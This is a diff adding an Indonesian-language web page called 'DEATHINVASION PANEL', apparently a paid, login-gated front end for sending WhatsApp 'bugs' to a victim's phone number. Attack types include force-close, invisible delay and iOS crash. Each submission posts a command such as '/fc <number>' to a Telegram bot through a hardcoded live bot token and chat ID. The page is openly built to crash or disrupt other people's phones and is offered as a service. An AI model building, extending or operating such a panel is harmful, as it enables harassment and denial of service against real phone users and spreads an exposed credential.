@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <title>DEATHINVASION PANEL</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body {
+      background-color: #0f0f0f;
+      color: white;
+      font-family: 'Segoe UI', sans-serif;
+      margin: 0;
+      padding: 0;
+      min-height: 100vh;
+    }
+    .container {
+      padding-top: 60px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    h1, h2 {
+      color: #00ffd5;
+      margin: 0;
+    }
+    form, #login {
+      background: #1f1f1f;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px #00ffd5;
+      width: 90%;
+      max-width: 350px;
+      margin-top: 20px;
+    }
+    input, select, button {
+      width: 100%;
+      margin-top: 15px;
+      padding: 10px;
+      font-size: 1rem;
+      border: none;
+      border-radius: 6px;
+    }
+    input, select {
+      background: #2b2b2b;
+      color: white;
+    }
+    button {
+      background: #00ffd5;
+      color: black;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+    button:hover {
+      background: #00c0aa;
+    }
+    .message {
+      margin-top: 20px;
+      font-size: 0.9rem;
+    }
+    .logout-btn {
+      background: #ff4c4c;
+      color: white;
+      border: none;
+      padding: 10px;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+      width: 100%;
+      max-width: 320px;
+      margin-top: 8px;
+      display: none;
+      transition: 0.3s;
+    }
+    .logout-btn:hover {
+      background: #e03e3e;
+    }
+    .bottom-links {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin: 40px 20px;
+    }
+    .bottom-links a {
+      text-decoration: none;
+      color: white;
+      background: #00ffd5;
+      padding: 10px;
+      margin: 8px 0;
+      border-radius: 6px;
+      width: 100%;
+      max-width: 320px;
+      text-align: center;
+      font-weight: bold;
+      transition: 0.3s ease;
+    }
+    .bottom-links a:hover {
+      background: #00c0aa;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>DEATHINVASION PANEL 🥵</h1>
+
+    <!-- LOGIN FORM -->
+    <div id="login">
+      <h2>🔐 Login</h2>
+      <input id="u" placeholder="Username">
+      <input id="p" type="password" placeholder="Password">
+      <button onclick="doLogin()">Login</button>
+      <div class="message" id="lm"></div>
+    </div>
+
+    <!-- BUG FORM -->
+    <form id="bugForm" style="display:none;">
+      <h2>🧨 Kirim Bug</h2>
+      <input type="tel" id="target" placeholder="62xxxxxxxxxx" inputmode="numeric" pattern="[0-9]*" required />
+      <select id="bugType" required>
+        <option value="forclose">Forclose</option>
+        <option value="invisible">Delay Invisible</option>
+        <option value="ios">Crash iOS</option>
+      </select>
+      <button type="submit">🚀 Kirim Bug</button>
+      <div class="message" id="bm"></div>
+    </form>
+
+    <!-- BOTTOM LINKS + LOGOUT -->
+    <div class="bottom-links" id="extraLinks" style="display: none;">
+      <a href="https://bimxyzdev.vercel.app" target="_blank">📩 Contact Developer</a>
+      <a href="https://whatsapp.com/channel/0029Vb84dWwDDmFWkPoFW735" target="_blank">ℹ️ Information</a>
+      <button class="logout-btn" onclick="logout()">Logout</button>
+    </div>
+  </div>
+
+  <script>
+    const URL_USERS = 'https://raw.githubusercontent.com/BimxyzDev/Akunbug/main/users/bimxyz.json';
+    const TELEGRAM_TOKEN = '7895593522:AAHsKPL9sXn1bniOALFP1x69TQuJU3h9CRM';
+    const TELEGRAM_ID = '6629230649';
+
+    async function doLogin() {
+      const u = document.getElementById('u').value.trim();
+      const p = document.getElementById('p').value.trim();
+      const lm = document.getElementById('lm');
+      lm.textContent = '⏳ Mengecek...';
+
+      try {
+        const res = await fetch(URL_USERS);
+        const data = await res.json();
+
+        const user = data.find(acc => acc.username === u && acc.password === p);
+        if (!user) {
+          lm.textContent = '❌ Username atau password salah!';
+          return;
+        }
+
+        const today = new Date().toISOString().split("T")[0];
+        if (today > user.expired) {
+          lm.textContent = '⛔ Akun expired!';
+          return;
+        }
+
+        lm.textContent = '✅ Login berhasil!';
+        document.getElementById('login').style.display = 'none';
+        document.getElementById('bugForm').style.display = 'block';
+        document.querySelector('.logout-btn').style.display = 'inline-block';
+        document.getElementById('extraLinks').style.display = 'flex';
+      } catch (err) {
+        lm.textContent = '⚠️ Error: ' + err.message;
+      }
+    }
+
+    document.getElementById('bugForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const target = document.getElementById('target').value.trim();
+      const bugType = document.getElementById('bugType').value;
+      let command;
+
+      if (bugType === 'forclose') command = `/fc ${target}`;
+      else if (bugType === 'invisible') command = `/invis ${target}`;
+      else if (bugType === 'ios') command = `/ios ${target}`;
+      else return;
+
+      const msgBox = document.getElementById('bm');
+      msgBox.textContent = '⏳ Mengirim...';
+
+      try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+        const res = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_ID,
+            text: command
+          })
+        });
+
+        if (res.ok) {
+          msgBox.textContent = `✅ SUKSES MENGIRIMKAN BUG KE NOMOR ${target}`;
+        } else {
+          msgBox.textContent = '❌ GAGAL MENGIRIMKAN BUG KE NOMOR ${target}';
+        }
+      } catch (err) {
+        msgBox.textContent = '⚠️ Error: ' + err.message;
+      }
+    });
+
+    function logout() {
+      document.getElementById('bugForm').reset();
+      document.getElementById('u').value = '';
+      document.getElementById('p').value = '';
+      document.getElementById('bugForm').style.display = 'none';
+      document.getElementById('extraLinks').style.display = 'none';
+      document.getElementById('login').style.display = 'block';
+      document.querySelector('.logout-btn').style.display = 'none';
+      document.getElementById('lm').textContent = '✅ Logout berhasil.';
+    }
+  </script>
+</body>
+  </html>
